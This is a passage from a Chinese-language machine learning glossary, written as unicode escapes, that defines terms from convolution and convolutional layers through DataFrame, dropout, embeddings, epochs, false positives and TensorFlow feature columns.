\u76f8\u53cd\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u56fe\u5f62\u90fd\u4e0d\u662f\u51f8\u96c6\uff1a 4.18. \u5377\u79ef (convolution) # \u7b80\u5355\u6765\u8bf4\uff0c\u5377\u79ef\u5728\u6570\u5b66\u4e2d\u6307\u4e24\u4e2a\u51fd\u6570\u7684\u7ec4\u5408\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u5377\u79ef\u7ed3\u5408\u4f7f\u7528\u5377\u79ef\u8fc7\u6ee4\u5668\u548c\u8f93\u5165\u77e9\u9635\u6765\u8bad\u7ec3\u6743\u91cd\u3002 \u673a\u5668\u5b66\u4e60\u4e2d\u7684\"\u5377\u79ef\"\u4e00\u8bcd\u901a\u5e38\u662f \u5377\u79ef\u8fd0\u7b97 \u6216 \u5377\u79ef\u5c42 \u7684\u7b80\u79f0\u3002 \u5982\u679c\u6ca1\u6709\u5377\u79ef\uff0c\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u5c31\u9700\u8981\u5b66\u4e60\u5927\u5f20\u91cf\u4e2d\u6bcf\u4e2a\u5355\u5143\u683c\u5404\u81ea\u7684\u6743\u91cd\u3002\u4f8b\u5982\uff0c\u7528 2K x 2K \u56fe\u50cf\u8bad\u7ec3\u7684\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u5c06\u88ab\u8feb\u627e\u51fa 400 \u4e07\u4e2a\u5355\u72ec\u7684\u6743\u91cd\u3002\u800c\u4f7f\u7528\u5377\u79ef\uff0c\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u53ea\u9700\u5728 \u5377\u79ef\u8fc7\u6ee4\u5668 \u4e2d\u627e\u51fa\u6bcf\u4e2a\u5355\u5143\u683c\u7684\u6743\u91cd\uff0c\u5927\u5927\u51cf\u5c11\u4e86\u8bad\u7ec3\u6a21\u578b\u6240\u9700\u7684\u5185\u5b58\u3002\u5728\u5e94\u7528\u5377\u79ef\u8fc7\u6ee4\u5668\u540e\uff0c\u5b83\u53ea\u9700\u8de8\u5355\u5143\u683c\u8fdb\u884c\u590d\u5236\uff0c\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u4f1a\u4e0e\u8fc7\u6ee4\u5668\u76f8\u4e58\u3002 4.19. \u5377\u79ef\u8fc7\u6ee4\u5668 (convolutional filter) # \u5377\u79ef\u8fd0\u7b97 \u4e2d\u7684\u4e24\u4e2a\u53c2\u4e0e\u65b9\u4e4b\u4e00\u3002\uff08\u53e6\u4e00\u4e2a\u53c2\u4e0e\u65b9\u662f\u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\uff09\u5377\u79ef\u8fc7\u6ee4\u5668\u662f\u4e00\u79cd\u77e9\u9635\uff0c\u5176 \u7b49\u7ea7 \u4e0e\u8f93\u5165\u77e9\u9635\u76f8\u540c\uff0c\u4f46\u5f62\u72b6\u5c0f\u4e00\u4e9b\u3002\u4ee5 28\u00d728 \u7684\u8f93\u5165\u77e9\u9635\u4e3a\u4f8b\uff0c\u8fc7\u6ee4\u5668\u53ef\u4ee5\u662f\u5c0f\u4e8e 28\u00d728 \u7684\u4efb\u4f55\u4e8c\u7ef4\u77e9\u9635\u3002 \u5728\u56fe\u5f62\u64cd\u4f5c\u4e2d\uff0c\u5377\u79ef\u8fc7\u6ee4\u5668\u4e2d\u7684\u6240\u6709\u5355\u5143\u683c\u901a\u5e38\u6309\u7167\u56fa\u5b9a\u6a21\u5f0f\u8bbe\u7f6e\u4e3a 1 \u548c 0\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u5377\u79ef\u8fc7\u6ee4\u5668\u901a\u5e38\u5148\u9009\u62e9\u968f\u673a\u6570\u5b57\uff0c\u7136\u540e\u7531\u7f51\u7edc\u8bad\u7ec3\u51fa\u7406\u60f3\u503c\u3002 4.20. \u5377\u79ef\u5c42 (convolutional layer) # \u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7684\u4e00\u4e2a\u5c42\uff0c \u5377\u79ef\u8fc7\u6ee4\u5668 \u4f1a\u5728\u5176\u4e2d\u4f20\u9012\u8f93\u5165\u77e9\u9635\u3002\u4ee5\u4e0b\u9762\u7684 3x3 \u5377\u79ef\u8fc7\u6ee4\u5668 \u4e3a\u4f8b\uff1a \u4e0b\u9762\u7684\u52a8\u753b\u663e\u793a\u4e86\u4e00\u4e2a\u7531 9 \u4e2a\u5377\u79ef\u8fd0\u7b97\uff08\u6d89\u53ca 5x5 \u8f93\u5165\u77e9\u9635\uff09\u7ec4\u6210\u7684\u5377\u79ef\u5c42\u3002\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u6d89\u53ca\u4e00\u4e2a\u4e0d\u540c\u7684 3x3 \u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\u7531\u6b64\u4ea7\u751f\u7684 3\u00d73 \u77e9\u9635\uff08\u53f3\u4fa7\uff09\u5c31\u5305\u542b 9 \u4e2a\u5377\u79ef\u8fd0\u7b97\u7684\u7ed3\u679c\uff1a 4.21. \u5377\u79ef\u795e\u7ecf\u7f51\u7edc (convolutional neural network) # \u4e00\u79cd\u795e\u7ecf\u7f51\u7edc\uff0c\u5176\u4e2d\u81f3\u5c11\u6709\u4e00\u5c42\u4e3a \u5377\u79ef\u5c42 \u3002\u5178\u578b\u7684\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u5305\u542b\u4ee5\u4e0b\u51e0\u5c42\u7684\u7ec4\u5408\uff1a \u5377\u79ef\u5c42 \u6c60\u5316\u5c42 \u5bc6\u96c6\u5c42 \u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u5728\u89e3\u51b3\u67d0\u4e9b\u7c7b\u578b\u7684\u95ee\u9898\uff08\u5982\u56fe\u50cf\u8bc6\u522b\uff09\u4e0a\u53d6\u5f97\u4e86\u5de8\u5927\u6210\u529f\u3002 4.22. \u5377\u79ef\u8fd0\u7b97 (convolutional operation) # \u5982\u4e0b\u6240\u793a\u7684\u4e24\u6b65\u6570\u5b66\u8fd0\u7b97\uff1a \u5bf9 \u5377\u79ef\u8fc7\u6ee4\u5668 \u548c\u8f93\u5165\u77e9\u9635\u5207\u7247\u6267\u884c\u5143\u7d20\u7ea7\u4e58\u6cd5\u3002\uff08\u8f93\u5165\u77e9\u9635\u5207\u7247\u4e0e\u5377\u79ef\u8fc7\u6ee4\u5668\u5177\u6709\u76f8\u540c\u7684\u7b49\u7ea7\u548c\u5927\u5c0f\u3002\uff09 \u5bf9\u751f\u6210\u7684\u79ef\u77e9\u9635\u4e2d\u7684\u6240\u6709\u503c\u6c42\u548c\u3002 \u4ee5\u4e0b\u9762\u7684 5x5 \u8f93\u5165\u77e9\u9635\u4e3a\u4f8b\uff1a \u73b0\u5728\uff0c\u4ee5\u4e0b\u9762\u8fd9\u4e2a 2x2 \u5377\u79ef\u8fc7\u6ee4\u5668\u4e3a\u4f8b\uff1a \u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u6d89\u53ca\u4e00\u4e2a 2x2 \u8f93\u5165\u77e9\u9635\u5207\u7247\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u6211\u4eec\u4f7f\u7528\u8f93\u5165\u77e9\u9635\u5de6\u4e0a\u89d2\u7684 2x2 \u5207\u7247\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5bf9\u6b64\u5207\u7247\u8fdb\u884c\u5377\u79ef\u8fd0\u7b97\u5c06\u5982\u4e0b\u6240\u793a\uff1a \u5377\u79ef\u5c42 \u7531\u4e00\u7cfb\u5217\u5377\u79ef\u8fd0\u7b97\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5377\u79ef\u8fd0\u7b97\u90fd\u9488\u5bf9\u4e0d\u540c\u7684\u8f93\u5165\u77e9\u9635\u5207\u7247\u3002 4.23. \u6210\u672c (cost) # \u4e0e \u635f\u5931 \u7684\u542b\u4e49\u76f8\u540c\u3002 4.24. \u4ea4\u53c9\u71b5 (cross-entropy) # \u5bf9\u6570\u635f\u5931\u51fd\u6570 \u5411 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898 \u7684\u4e00\u79cd\u6cdb\u5316\u3002\u4ea4\u53c9\u71b5\u53ef\u4ee5\u91cf\u5316\u4e24\u79cd\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\u53e6\u8bf7\u53c2\u9605 \u56f0\u60d1\u5ea6 \u3002 4.25. \u81ea\u5b9a\u4e49 Estimator (custom Estimator) # \u60a8\u6309\u7167 \u8fd9\u4e9b\u8bf4\u660e \u81ea\u884c\u7f16\u5199\u7684 Estimator \u3002 \u4e0e \u9884\u521b\u5efa\u7684 Estimator \u76f8\u5bf9\u3002 5. D # 5.1. \u6570\u636e\u5206\u6790 (data analysis) # \u6839\u636e\u6837\u672c\u3001\u6d4b\u91cf\u7ed3\u679c\u548c\u53ef\u89c6\u5316\u5185\u5bb9\u6765\u7406\u89e3\u6570\u636e\u3002\u6570\u636e\u5206\u6790\u5728\u9996\u6b21\u6536\u5230\u6570\u636e\u96c6\u3001\u6784\u5efa\u7b2c\u4e00\u4e2a\u6a21\u578b\u4e4b\u524d\u7279\u522b\u6709\u7528\u3002\u6b64\u5916\uff0c\u6570\u636e\u5206\u6790\u5728\u7406\u89e3\u5b9e\u9a8c\u548c\u8c03\u8bd5\u7cfb\u7edf\u95ee\u9898\u65b9\u9762\u4e5f\u81f3\u5173\u91cd\u8981\u3002 5.2. DataFrame # \u4e00\u79cd\u70ed\u95e8\u7684\u6570\u636e\u7c7b\u578b\uff0c\u7528\u4e8e\u8868\u793a Pandas \u4e2d\u7684\u6570\u636e\u96c6\u3002DataFrame \u7c7b\u4f3c\u4e8e\u8868\u683c\u3002DataFrame \u7684\u6bcf\u4e00\u5217\u90fd\u6709\u4e00\u4e2a\u540d\u79f0\uff08\u6807\u9898\uff09\uff0c\u6bcf\u4e00\u884c\u90fd\u7531\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\u3002 5.3. \u6570\u636e\u96c6 (data set) # \u4e00\u7ec4 \u6837\u672c \u7684\u96c6\u5408\u3002 5.4. Dataset API (tf.data) # \u4e00\u79cd\u9ad8\u7ea7\u522b\u7684 TensorFlow API\uff0c\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u6240\u9700\u7684\u683c\u5f0f\u3002 tf.data.Dataset \u5bf9\u8c61\u8868\u793a\u4e00\u7cfb\u5217\u5143\u7d20\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5143\u7d20\u90fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a \u5f20\u91cf \u3002 tf.data.Iterator \u5bf9\u8c61\u53ef\u83b7\u53d6 Dataset \u4e2d\u7684\u5143\u7d20\u3002 \u5982\u9700\u8be6\u7ec6\u4e86\u89e3 Dataset API\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u5bfc\u5165\u6570\u636e \u3002 5.5. \u51b3\u7b56\u8fb9\u754c (decision boundary) # \u5728 \u4e8c\u5143\u5206\u7c7b \u6216 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898 \u4e2d\uff0c\u6a21\u578b\u5b66\u5230\u7684\u7c7b\u522b\u4e4b\u95f4\u7684\u5206\u754c\u7ebf\u3002\u4f8b\u5982\uff0c\u5728\u4ee5\u4e0b\u8868\u793a\u67d0\u4e2a\u4e8c\u5143\u5206\u7c7b\u95ee\u9898\u7684\u56fe\u7247\u4e2d\uff0c\u51b3\u7b56\u8fb9\u754c\u662f\u6a59\u8272\u7c7b\u522b\u548c\u84dd\u8272\u7c7b\u522b\u4e4b\u95f4\u7684\u5206\u754c\u7ebf\uff1a 5.6. \u5bc6\u96c6\u5c42 (dense layer) # \u4e0e \u5168\u8fde\u63a5\u5c42 \u7684\u542b\u4e49\u76f8\u540c\u3002 5.7. \u6df1\u5ea6\u6a21\u578b (deep model) # \u4e00\u79cd \u795e\u7ecf\u7f51\u7edc \uff0c\u5176\u4e2d\u5305\u542b\u591a\u4e2a \u9690\u85cf\u5c42 \u3002\u6df1\u5ea6\u6a21\u578b\u4f9d\u8d56\u4e8e\u53ef\u8bad\u7ec3\u7684\u975e\u7ebf\u6027\u5173\u7cfb\u3002 \u4e0e \u5bbd\u5ea6\u6a21\u578b \u76f8\u5bf9\u3002 5.8. \u5bc6\u96c6\u7279\u5f81 (dense feature) # \u4e00\u79cd\u5927\u90e8\u5206\u503c\u662f\u975e\u96f6\u503c\u7684 \u7279\u5f81 \uff0c\u901a\u5e38\u662f\u6d6e\u70b9\u503c \u5f20\u91cf \u3002\u4e0e \u7a00\u758f\u7279\u5f81 \u76f8\u5bf9\u3002 5.9. \u8bbe\u5907 (device) # \u4e00\u7c7b\u53ef\u8fd0\u884c TensorFlow \u4f1a\u8bdd\u7684\u786c\u4ef6\uff0c\u5305\u62ec CPU\u3001GPU \u548c TPU\u3002 5.10. \u79bb\u6563\u7279\u5f81 (discrete feature) # \u4e00\u79cd \u7279\u5f81 \uff0c\u5305\u542b\u6709\u9650\u4e2a\u53ef\u80fd\u503c\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u503c\u53ea\u80fd\u662f\"\u52a8\u7269\"\u3001\"\u852c\u83dc\"\u6216\"\u77ff\u7269\"\u7684\u7279\u5f81\u4fbf\u662f\u4e00\u4e2a\u79bb\u6563\u7279\u5f81\uff08\u6216\u5206\u7c7b\u7279\u5f81\uff09\u3002\u4e0e \u8fde\u7eed\u7279\u5f81 \u76f8\u5bf9\u3002 5.11. \u4e22\u5f03\u6b63\u5219\u5316 (dropout regularization) # \u6b63\u5219\u5316 \u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u5728\u8bad\u7ec3 \u795e\u7ecf\u7f51\u7edc \u65b9\u9762\u975e\u5e38\u6709\u7528\u3002\u4e22\u5f03\u6b63\u5219\u5316\u7684\u8fd0\u4f5c\u673a\u5236\u662f\uff0c\u5728\u4e00\u4e2a\u68af\u5ea6\u6b65\u957f\u4e2d\u79fb\u9664\u4ece\u795e\u7ecf\u7f51\u7edc\u5c42\u4e2d\u968f\u673a\u9009\u62e9\u7684\u56fa\u5b9a\u6570\u91cf\u7684\u5355\u5143\u3002\u4e22\u5f03\u7684\u5355\u5143\u8d8a\u591a\uff0c\u6b63\u5219\u5316\u6548\u679c\u5c31\u8d8a\u5f3a\u3002\u8fd9\u7c7b\u4f3c\u4e8e\u8bad\u7ec3\u795e\u7ecf\u7f51\u7edc\u4ee5\u6a21\u62df\u8f83\u5c0f\u7f51\u7edc\u7684\u6307\u6570\u7ea7\u89c4\u6a21\u96c6\u6210\u5b66\u4e60\u3002\u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Dropout: A Simple Way to Prevent Neural Networks from Overfitting \uff08\u300a\u4e22\u5f03\uff1a\u4e00\u79cd\u9632\u6b62\u795e\u7ecf\u7f51\u7edc\u8fc7\u62df\u5408\u7684\u7b80\u5355\u65b9\u6cd5\u300b\uff09\u3002 5.12. \u52a8\u6001\u6a21\u578b (dynamic model) # \u4e00\u79cd \u6a21\u578b \uff0c\u4ee5\u6301\u7eed\u66f4\u65b0\u7684\u65b9\u5f0f\u5728\u7ebf\u63a5\u53d7\u8bad\u7ec3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6570\u636e\u4f1a\u6e90\u6e90\u4e0d\u65ad\u5730\u8fdb\u5165\u8fd9\u79cd\u6a21\u578b\u3002 6. E # 6.1. \u65e9\u505c\u6cd5 (early stopping) # \u4e00\u79cd \u6b63\u5219\u5316 \u65b9\u6cd5\uff0c\u662f\u6307\u5728\u8bad\u7ec3\u635f\u5931\u4ecd\u53ef\u4ee5\u7ee7\u7eed\u964d\u4f4e\u4e4b\u524d\u7ed3\u675f\u6a21\u578b\u8bad\u7ec3\u3002\u4f7f\u7528\u65e9\u505c\u6cd5\u65f6\uff0c\u60a8\u4f1a\u5728 \u9a8c\u8bc1\u6570\u636e\u96c6 \u7684\u635f\u5931\u5f00\u59cb\u589e\u5927\uff08\u4e5f\u5c31\u662f \u6cdb\u5316 \u6548\u679c\u53d8\u5dee\uff09\u65f6\u7ed3\u675f\u6a21\u578b\u8bad\u7ec3\u3002 6.2. \u5d4c\u5957 (embeddings) # \u4e00\u79cd\u5206\u7c7b\u7279\u5f81\uff0c\u4ee5\u8fde\u7eed\u503c\u7279\u5f81\u8868\u793a\u3002\u901a\u5e38\uff0c\u5d4c\u5957\u662f\u6307\u5c06\u9ad8\u7ef4\u5ea6\u5411\u91cf\u6620\u5c04\u5230\u4f4e\u7ef4\u5ea6\u7684\u7a7a\u95f4\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u4e4b\u4e00\u6765\u8868\u793a\u82f1\u6587\u53e5\u5b50\u4e2d\u7684\u5355\u8bcd\uff1a \u8868\u793a\u6210\u5305\u542b\u767e\u4e07\u4e2a\u5143\u7d20\uff08\u9ad8\u7ef4\u5ea6\uff09\u7684 \u7a00\u758f\u5411\u91cf \uff0c\u5176\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u662f\u6574\u6570\u3002\u5411\u91cf\u4e2d\u7684\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u8868\u793a\u4e00\u4e2a\u5355\u72ec\u7684\u82f1\u6587\u5355\u8bcd\uff0c\u5355\u5143\u683c\u4e2d\u7684\u503c\u8868\u793a\u76f8\u5e94\u5355\u8bcd\u5728\u53e5\u5b50\u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u3002\u7531\u4e8e\u5355\u4e2a\u82f1\u6587\u53e5\u5b50\u5305\u542b\u7684\u5355\u8bcd\u4e0d\u592a\u53ef\u80fd\u8d85\u8fc7 50 \u4e2a\uff0c\u56e0\u6b64\u5411\u91cf\u4e2d\u51e0\u4e4e\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u5305\u542b 0\u3002\u5c11\u6570\u975e 0 \u7684\u5355\u5143\u683c\u4e2d\u5c06\u5305\u542b\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u6574\u6570\uff08\u901a\u5e38\u4e3a 1\uff09\uff0c\u8be5\u6574\u6570\u8868\u793a\u76f8\u5e94\u5355\u8bcd\u5728\u53e5\u5b50\u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u3002 \u8868\u793a\u6210\u5305\u542b\u6570\u767e\u4e2a\u5143\u7d20\uff08\u4f4e\u7ef4\u5ea6\uff09\u7684 \u5bc6\u96c6\u5411\u91cf \uff0c\u5176\u4e2d\u6bcf\u4e2a\u5143\u7d20\u90fd\u5b58\u50a8\u4e00\u4e2a\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u6d6e\u70b9\u503c\u3002\u8fd9\u5c31\u662f\u4e00\u79cd\u5d4c\u5957\u3002 \u5728 TensorFlow \u4e2d\uff0c\u4f1a\u6309 \u53cd\u5411\u4f20\u64ad \u635f\u5931 \u8bad\u7ec3\u5d4c\u5957\uff0c\u548c\u8bad\u7ec3 \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u4efb\u4f55\u5176\u4ed6\u53c2\u6570\u4e00\u6837\u3002 6.3. \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 (ERM, empirical risk minimization) # \u7528\u4e8e\u9009\u62e9\u53ef\u4ee5\u5c06\u57fa\u4e8e\u8bad\u7ec3\u96c6\u7684\u635f\u5931\u964d\u81f3\u6700\u4f4e\u7684\u51fd\u6570\u3002\u4e0e \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 \u76f8\u5bf9\u3002 6.4. \u96c6\u6210\u5b66\u4e60 (ensemble) # \u591a\u4e2a \u6a21\u578b \u7684\u9884\u6d4b\u7ed3\u679c\u7684\u5e76\u96c6\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4e00\u9879\u6216\u591a\u9879\u6765\u521b\u5efa\u96c6\u6210\u5b66\u4e60\uff1a \u4e0d\u540c\u7684\u521d\u59cb\u5316 \u4e0d\u540c\u7684 \u8d85\u53c2\u6570 \u4e0d\u540c\u7684\u6574\u4f53\u7ed3\u6784 \u6df1\u5ea6\u6a21\u578b\u548c\u5bbd\u5ea6\u6a21\u578b \u5c5e\u4e8e\u4e00\u79cd\u96c6\u6210\u5b66\u4e60\u3002 6.5. \u5468\u671f (epoch) # \u5728\u8bad\u7ec3\u65f6\uff0c\u6574\u4e2a\u6570\u636e\u96c6\u7684\u4e00\u6b21\u5b8c\u6574\u904d\u5386\uff0c\u4ee5\u4fbf\u4e0d\u6f0f\u6389\u4efb\u4f55\u4e00\u4e2a\u6837\u672c\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u5468\u671f\u8868\u793a\uff08 N / \u6279\u6b21\u5927\u5c0f \uff09\u6b21\u8bad\u7ec3 \u8fed\u4ee3 \uff0c\u5176\u4e2d N \u662f\u6837\u672c\u603b\u6570\u3002 6.6. Estimator # tf.Estimator \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u7528\u4e8e\u5c01\u88c5\u8d1f\u8d23\u6784\u5efa TensorFlow \u56fe\u5e76\u8fd0\u884c TensorFlow \u4f1a\u8bdd\u7684\u903b\u8f91\u3002\u60a8\u53ef\u4ee5\u521b\u5efa \u81ea\u5b9a\u4e49 Estimator \uff08\u5982\u9700\u76f8\u5173\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u6b64\u5904 \uff09\uff0c\u4e5f\u53ef\u4ee5\u5b9e\u4f8b\u5316\u5176\u4ed6\u4eba \u9884\u521b\u5efa\u7684 Estimator \u3002 6.7. \u6837\u672c (example) # \u6570\u636e\u96c6\u7684\u4e00\u884c\u3002\u4e00\u4e2a\u6837\u672c\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a \u7279\u5f81 \uff0c\u6b64\u5916\u8fd8\u53ef\u80fd\u5305\u542b\u4e00\u4e2a \u6807\u7b7e \u3002\u53e6\u8bf7\u53c2\u9605 \u6709\u6807\u7b7e\u6837\u672c \u548c \u65e0\u6807\u7b7e\u6837\u672c \u3002 7. F # 7.1. \u5047\u8d1f\u4f8b (FN, false negative) # \u88ab\u6a21\u578b\u9519\u8bef\u5730\u9884\u6d4b\u4e3a \u8d1f\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\uff08\u8d1f\u7c7b\u522b\uff09\uff0c\u4f46\u8be5\u7535\u5b50\u90ae\u4ef6\u5176\u5b9e\u662f\u5783\u573e\u90ae\u4ef6\u3002 7.2. \u5047\u6b63\u4f8b (FP, false positive) # \u88ab\u6a21\u578b\u9519\u8bef\u5730\u9884\u6d4b\u4e3a \u6b63\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\uff08\u6b63\u7c7b\u522b\uff09\uff0c\u4f46\u8be5\u7535\u5b50\u90ae\u4ef6\u5176\u5b9e\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\u3002 7.3. \u5047\u6b63\u4f8b\u7387\uff08false positive rate, \u7b80\u79f0 FP \u7387\uff09 # ROC \u66f2\u7ebf \u4e2d\u7684 x \u8f74\u3002FP \u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u5047\u6b63\u4f8b\u7387} = \\frac{\\text{\u5047\u6b63\u4f8b\u6570}}{\\text{\u5047\u6b63\u4f8b\u6570 + \u8d1f\u4f8b\u6570}} 7.4. \u7279\u5f81 (feature) # \u5728\u8fdb\u884c \u9884\u6d4b \u65f6\u4f7f\u7528\u7684\u8f93\u5165\u53d8\u91cf\u3002 7.5. \u7279\u5f81\u5217 (tf.feature_column) # \u6307\u5b9a\u6a21\u578b\u5e94\u8be5\u5982\u4f55\u89e3\u8bfb\u7279\u5b9a\u7279\u5f81\u7684\u4e00\u79cd\u51fd\u6570\u3002\u6b64\u7c7b\u51fd\u6570\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u6240\u6709 Estimators \u6784\u9020\u51fd\u6570\u7684\u5fc5\u9700\u53c2\u6570\u3002 \u501f\u52a9 tf.feature_column \u51fd\u6570\uff0c\u6a21\u578b\u53ef\u5bf9\u8f93\u5165\u7279\u5f81\u7684\u4e0d\u540c\u8868\u793a\u6cd5\u8f7b\u677e\u8fdb\u884c\u5b9e\u9a8c\u3002\u6709\u5173\u8be6\u60c5\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u7279\u5f81\u5217 \u4e00\u7ae0\u3002 \"\u7279\u5f81\u5217\"\u662f Google \u4e13\u7528\u7684\u672f\u8bed\u3002\u7279\u5f81\u5217\u5728 Yahoo/Microsoft \u4f7f\u7528\u7684 VW \u7cfb\u7edf\u4e2d\u79f0\u4e3a\"\u547d\u540d\u7a7a\u95f4\"\uff0c\u4e5f\u79f0\u4e3a \u573a \u3002 7.6. \u7279\u5f81\u7ec4\u5408 (feature cross) # \u901a\u8fc7\u5c06\u5355\u72ec\u7684\u7279\u5f81\u8fdb\u884c\u7ec4\u5408\uff08\u6c42\u7b1b\u5361\u5c14\u79ef\uff09\u800c\u5f62\u6210\u7684 \u5408\u6210\u7279\u5f81 \u3002\u7279\u5f81\u7ec4\u5408\u6709\u52a9\u4e8e\u8868\u8fbe\u975e\u7ebf\u6027\u5173\u7cfb\u3002 7.7. \u7279\u5f81\u5de5\u7a0b (feature engineering) # \u6307\u4ee5\u4e0b\u8fc7\u7a0b\uff1a\u786e\u5b9a\u54ea\u4e9b \u7279\u5f81 \u53ef\u80fd\u5728\u8bad\u7ec3\u6a21\u578b\u65b9\u9762\u975e\u5e38\u6709\u7528\uff0c\u7136\u540e\u5c06\u65e5\u5fd7\u6587\u4ef6\u53ca\u5176\u4ed6\u6765\u6e90\u7684\u539f\u59cb\u6570\u636e\u8f6c\u6362\u4e3a\u6240\u9700\u7684\u7279\u5f81\u3002\u5728 TensorFlow \u4e2d\uff0c\u7279\u5f81\u5de5\u7a0b\u901a\u5e38\u662f\u6307\u5c06\u539f\u59cb\u65e5\u5fd7\u6587\u4ef6\u6761\u76ee\u8f6c\u6362\u4e3a tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u3002\u53e6\u8bf7\u53c2\u9605 tf.Transform \u3002 \u7279\u5f81\u5de5\u7a0b\u6709\u65f6\u79f0\u4e3a\u7279\u5f81\u63d0\u53d6\u3002 7.8. \u7279\u5f81\u96c6 (feature set) # \u8bad\u7ec3\u673a\u5668\u5b66\u4e60\u6a21\u578b\u65f6\u91c7\u7528\u7684\u4e00\u7ec4 \u7279\u5f81 \u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u67d0\u4e2a\u7528\u4e8e\u9884\u6d4b\u623f\u4ef7\u7684\u6a21\u578b\uff0c\u90ae\u653f\u7f16\u7801\u3001\u623f\u5c4b\u9762\u79ef\u4ee5\u53ca\u623f\u5c4b\u72b6\u51b5\u53ef\u4ee5\u7ec4\u6210\u4e00\u4e2a\u7b80\u5355\u7684\u7279\u5f81\u96c6\u3002 7.9. \u7279\u5f81\u89c4\u8303 (feature spec) # \u7528\u4e8e\u63cf\u8ff0\u5982\u4f55\u4ece tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u63d0\u53d6 \u7279\u5f81 \u6570\u636e\u3002\u7531\u4e8e tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u53ea\u662f\u4e00\u4e2a\u6570\u636e\u5bb9\u5668\uff0c\u56e0\u6b64\u60a8\u5fc5\u987b\u6307\u5b9a\u4ee5\u4e0b\u5185\u5bb9\uff1a \u8981\u63d0\u53d6\u7684\u6570\u636e\uff08\u5373\u7279\u5f81\u7684\u952e\uff09 \u6570\u636e\u7c7b\u578b\uff08\u4f8b\u5982 float \u6216 int\uff09 \u957f\u5ea6\uff08\u56fa\u5b9a\u6216\u53ef\u53d8\uff09 Estimator API \u63d0\u4f9b\u4e86\u4e00\u4e9b\u53ef\u7528\u6765\u6839\u636e\u7ed9\u5b9a FeatureColumns \u5217\u8868\u751f\u6210\u7279\u5f81\u89c4\u8303\u7684\u5de5\u5177\u3002 7.10. \u5c11\u91cf\u6837\u672c\u5b66\u4e60 (few-shot learning) # \u4e00\u79cd\u673a\u5668\u5b66\u4e60\u65b9\u6cd5\uff08\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09\uff0c\u65e8\u5728\u4ec5\u901a\u8fc7\u5c11\u91cf\u8bad\u7ec3\u6837\u672c\u5b66\u4e60\u6709\u6548\u7684\u5206\u7c7b\u5668\u3002 \u53e6\u8bf7\u53c2\u9605 \u5355\u6837\u672c\u5b66\u4e60 \u3002 7.11. \u5b8c\u6574 softmax (full softmax) # \u8bf7\u53c2\u9605 softmax \u3002\u4e0e \u5019\u9009\u91c7\u6837 \u76f8\u5bf9\u3002 7.12. \u5168\u8fde\u63a5\u5c42 (fully connected layer) # \u4e00\u79cd \u9690\u85cf\u5c42 